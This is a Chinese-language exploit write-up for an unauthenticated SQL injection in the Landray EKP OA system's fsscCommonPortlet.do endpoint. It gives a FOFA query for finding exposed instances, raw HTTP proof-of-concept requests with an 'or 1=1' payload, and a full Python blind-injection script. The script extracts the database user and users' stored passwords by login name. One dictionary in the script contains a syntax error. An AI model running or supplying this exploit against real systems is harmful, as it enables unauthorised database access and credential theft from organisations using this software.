# 蓝凌EKP系统fsscCommonPortlet.do存在未授权SQL注入漏洞

蓝凌EKP系统fsscCommonPortlet.do存在未授权SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息。

## fofa
```javascript
app="Landray-OA系统"
```

## poc

访问save方法，填充一下数据库

```javascript
POST /ekp/fssc/common/fssc_common_portlet/fsscCommonPortlet.do HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

method=saveICare&fdId=&fdNum=1&docSubject=1&fdName=1&createTime=1&fdStatus=1
```

```javascript
POST /ekp/fssc/common/fssc_common_portlet/fsscCommonPortlet.do HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

method=getICareByFdId&fdNum=asdasd'+or+'1'='1&ordertype=down
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272240962.png)

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272240942.png)



## Python脚本

```python
import argparse

import requests

header = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
}


def exploit_user(url,db_user):
    global header
    user_name = ""
    for i in range(1, 20):
        low = 1
        top = 255
        mid = (low + top) // 2
        while low < top:
            send_data = {
                "method": "getICareByFdId",
                "ordertype": "down",
                "fdNum": "aNsSl' or ascii(substring((user_name()),{},1)) < {} and '1'='1".format(
                    i, mid)
            }
            res = requests.post(url, data=send_data, headers=header)
            if "docSubject" in res.text:
                top = mid
            else:
                low = mid + 1
            mid = (top + low) // 2
        if mid <= 1 or mid >= 254:
            break
        user_name = user_name + chr(mid - 1)
        print("[+]user_name:{}".format(user_name))
        print("\033[F", end="")
    print("[+]user_name:{}".format(user_name))
def exploit(url,username):
    global header
    password_len = 32
    password = ""
    for i in range(1,password_len+1):
        low = 1
        top = 255
        mid = (low + top) // 2
        while low < top:
            send_data = {
                "method": "getICareByFdId",
                "ordertype": "down",
                "fdNum": "aNsSl' or ascii(substring((select fdPassword from com.landray.kmss.sys.organization.model.SysOrgPerson where fdLoginName='{}'),{},1)) < {} and '1'='1".format(
                    username,i, mid)
            }
            res = requests.post(url,data=send_data,headers=header)
            if "docSubject" in res.text:
                top = mid
            else:
                low = mid + 1
            mid = (top + low) // 2
        password = password + chr(mid-1)
        print("[+]password:{}".format(password))
        print("\033[F",end="")
    print("[+]password:{}".format(password))

def scan_vuln(url,username,db_user):
    global header
    req_url = url.strip("/") + "/fssc/common/fssc_common_portlet/fsscCommonPortlet.do"

    step_data = {
        "method":"saveICare",
        "fdId:"","
        "fdNum":"1",
        "docSubject":"1",
        "fdName":"test",
        "createTime":"1",
        "fdStatus":"1"
    }
    try:
        req1 = requests.post(req_url,data=step_data,headers=header)
        if req1.status_code == 200 and "result" in req1.text:
            print("[+]Vuln exist，start inject password:")
            if db_user == "check":
                exploit_user(req_url,db_user)
            else:
                exploit(req_url,username)
        else:
            print("[-]Vuln not exist.")
            exit(0)
    except:
        print("[-]request error.")
        exit(0)
        pass


def main():
    parser = argparse.ArgumentParser(description="Process command line arguments")
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-db_user', '--db_user', required=False, help='db_user')
    parser.add_argument('-U', '--username', required=False, help='Username argument')

    args = parser.parse_args()

    url = args.url
    db_user = args.db_user
    username = args.username
    scan_vuln(url, username, db_user)


if __name__ == '__main__':
    main()
```

## 漏洞来源

- https://xz.aliyun.com/t/16103?time__1311=GuD%3D7KiK0KYIx05DK7qCuxWuEoT6PGC4E8eD